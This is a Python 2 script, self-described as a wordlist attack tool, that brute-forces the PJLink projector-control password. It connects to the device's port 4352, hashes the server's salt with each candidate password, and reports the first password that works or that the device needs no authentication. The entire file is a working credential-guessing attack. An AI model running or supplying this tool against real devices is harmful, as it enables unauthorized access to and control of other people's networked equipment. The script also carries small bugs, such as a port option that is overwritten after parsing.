#! /usr/bin/python

#Simple script for wordlist based attack against the pjlink

import sys
import getopt
import socket
import errno
import re
import hashlib
import string

def usage():
    print "PJLink_pass_bf.py -d devce -w wordlist [-p port] [-h]"
    print "-d device - pjlink device IP, host, or FQDN"
    print "-w wordlist - file with passwords to try, one password per line"
    print "-p port - PJLink port, by default 4352"
    print "-h print this help"
    sys.exit(1)

def TestPJLinkPassword(pjlink_device, pjlink_port, pjlink_password):
    command = '%1POWR ?\r'
    buffer_size = 1024
    
    state = 'init'
    #Possible states
    #init - before any communication starts
    #auth_p1 - pjlink server sends salt (random 4 bytes number)
    #auth_p2 - pjlink clinet sends MD5(Salt+Pass)+Command
    #auth_p3 - pjlink decline or respond to Command
    
    LoginResultMessage = "UNKNOWN"
    LoginResultCode = 30
    
    # LoginResultMessage    | LoginResultCode
    # ----------------------+------------------
    # "Cannot Connect"      | 11
    # "Wrong password"      | 12
    # "No authentification" | 21
    # "Working passwrod"    | 22
    # "UNKNOWN"             | 30
    
    try:
      pjlink_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      pjlink_socket.connect((pjlink_device, pjlink_port))
      connected = True
    except socket.error as serr:
      LoginResultMessage = "Cannot Connect"+ str(serr)
      LoginResultCode = 11
      connected = False
    while connected:
      recv_data = pjlink_socket.recv(buffer_size)
      #print recv_data
      if state == 'init':
        if re.match(r'^PJLINK 0.*$', recv_data):
          #print "No authentification"
          LoginResultMessage = "No authentification" 
          LoginResultCode = 21
          break
        elif re.match(r'^PJLINK 1.*$', recv_data):
          state = 'auth_p1'
          salt = recv_data.replace("PJLINK 1 ", "").strip()
          pAndS = (str(salt)+str(pjlink_password))
          pAndSHash = hashlib.md5(pAndS)
          command = pAndSHash.hexdigest() + command
          #print "Authentification required"
          #print salt
          #print pAndS
          #print pAndSHash.hexdigest()
          #print command
          pjlink_socket.send(command)
          state = 'auth_p2'
        else:
          #print "UNKOWN"
          break
      elif state == 'auth_p2':
        if re.match(r'^^PJLINK ERRA.*$', recv_data):
          #print "Wrong password"
          LoginResultMessage = "Wrong password"
          LoginResultCode = 12
          break
        elif re.match(r'^%1POWR=.*$', recv_data):
          LoginResultMessage = "Working passwrod"
          LoginResultCode = 22
          #print "Working passwrod"
          break
    result = {'Device': pjlink_device, 'Port': pjlink_port, 'Password': pjlink_password,'LoginResultMessage': LoginResultMessage, 'LoginResultCode': LoginResultCode}
    pjlink_socket.close()
    return(result)

argv = sys.argv[1:]
opts, args = getopt.getopt(argv, 'd:p:w:h', ['device=', 'port=', 'wordlist=', 'help'])

for opt, arg in opts:
  if opt in ('-d', '--device'):
      device = arg
  if opt in ('-p', '--port'):
      port = int(arg)
  if opt in ('-w', '--wordlist'):
      wordlist = arg
  if opt in ('-h', '--help'):
      usage()

#define some constanst to make life easier
port = 4352
password = 'test'

passwords = open(wordlist, "r")
for password in passwords:
  passTestResults = TestPJLinkPassword(device, port, password.strip())
  if ((passTestResults['LoginResultCode'] > 20) and (passTestResults['LoginResultCode'] < 30)):
    print(passTestResults)
    break
  if (passTestResults['LoginResultCode'] == 11):
    print(passTestResults)
    break
    
